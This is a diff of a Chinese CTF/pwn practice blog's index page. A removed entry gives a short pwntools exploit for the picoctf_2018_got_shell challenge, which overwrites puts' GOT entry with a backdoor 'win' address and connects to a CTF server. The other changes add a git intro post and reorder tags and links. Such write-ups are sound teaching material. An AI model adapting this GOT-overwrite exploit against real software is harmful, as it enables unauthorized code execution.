@@ -141,48 +141,6 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2021/03/29/buu每日一题（3）/" >buu每日一题（3）</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-03-29  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><blockquote>
-<p>单独写了篇文章，方法是fastbin attack</p>
-</blockquote>
-<ul>
-<li><a href="https://warm-winter.github.io/2021/04/19/0ctf-2017-babyheap/" target="_blank" rel="noopener">0ctf_2017_babyheap详解</a></li>
-</ul>
-<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
-<p>能给任意地址写入四个字节数据，32位。</p>
-<p>而且给了后门函数，直接修改puts的got表位win的地址即可。</p>
-<p>注意一点：发送数据应该发送的是整数，也就是hex()，而不是p32()，它是字符。</p>
-</blockquote>
-<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419145953699.png" alt="image-20210419145953699"></p>
-<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419150030225.png" alt="image-20210419150030225"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25946</span>)</span><br><span class="line">elf = ELF(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win = elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value?"</span>)</span><br><span class="line">p.sendline(hex(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"like"</span>)</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2021/03/29/buu每日一题（3）/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
 			<a href="/2021/03/19/团体程序设计天梯赛-练习集/" >团体程序设计天梯赛-练习集</a>
 		</h3>
 		</div>
@@ -363,7 +321,7 @@ var _hmt = _hmt || [];
 <li>字符转换：R</li>
 </ul>
 <h2 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h2><p>自动对齐：ctrl+alt+l</p>
-<p><a href="gdb调试.md" title="下载">点击下载</a></p>
+<p><a href="stkof" title="下载">点击下载</a></p>
 
 	
 	</div>
@@ -940,6 +898,42 @@ var _hmt = _hmt || [];
 </div>
 
 		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/01/30/git/" >git</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-30  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>开源的分布式<strong>版本控制</strong>系统</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
+<li>是分布式的</li>
+<li>内容按原数据方式存储</li>
+<li>没有全局的版本号</li>
+<li>内容的完整性（内容存储使用的是 SHA-1 哈希算法）</li>
+</ol>
+<p><img src="/2021/01/30/git/image-20210130111523672.png" alt="image-20210130111523672"></p>
+<h2 id="git-常用命令"><a href="#git-常用命令" class="headerlink" title="git 常用命令"></a>git 常用命令</h2><p><img src="/2021/01/30/git/gitcommands.jpg" alt="gitcommands"></p>
+
+	
+	</div>
+  <a type="button" href="/2021/01/30/git/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
 
 		</div>
 
@@ -1016,45 +1010,45 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
+			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
+		
+			<li><a href="/tags/house-of-force/">house of force<span>1</span></a></li>
+		
+			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
+		
+			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
+		
+			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
+		
+			<li><a href="/tags/v8/">v8<span>1</span></a></li>
 		
 			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
 		
-			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
-		
 			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
 		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+			<li><a href="/tags/buu刷题/">buu刷题<span>2</span></a></li>
 		
-			<li><a href="/tags/git/">git<span>1</span></a></li>
+			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
 		
 			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
 		
 			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
 		
-			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
+			<li><a href="/tags/git/">git<span>1</span></a></li>
 		
-			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
+			<li><a href="/tags/flair/">flair<span>1</span></a></li>
 		
-			<li><a href="/tags/buu刷题/">buu刷题<span>2</span></a></li>
-		
-			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
-		
-			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
-		
-			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
-		
-			<li><a href="/tags/house-of-force/">house of force<span>1</span></a></li>
+			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
 		
 			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
 		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
-		
 			<li><a href="/tags/基础知识/">基础知识<span>4</span></a></li>
 		
-			<li><a href="/tags/kernel-pwn/">kernel pwn<span>1</span></a></li>
+			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
 		
-			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
+			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>24</span></a></li>
@@ -1070,10 +1064,6 @@ var _hmt = _hmt || [];
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2021/04/26/快捷键/gdb调试/" ><i class="fa fa-file-o"></i>快捷键/gdb调试</a>
-      </li>
-    
-      <li>
         <a href="/2021/04/25/wdb-2018-2nd-easyfmt详解/" ><i class="fa fa-file-o"></i>wdb_2018_2nd_easyfmt详解</a>
       </li>
     
@@ -1087,6 +1077,10 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/04/24/hitcontraining-bamboobox/" ><i class="fa fa-file-o"></i>hitcontraining_bamboobox</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/20/hitcon-2014-stkof详解/" ><i class="fa fa-file-o"></i>hitcon_2014_stkof详解</a>
       </li>
     
   </ul>
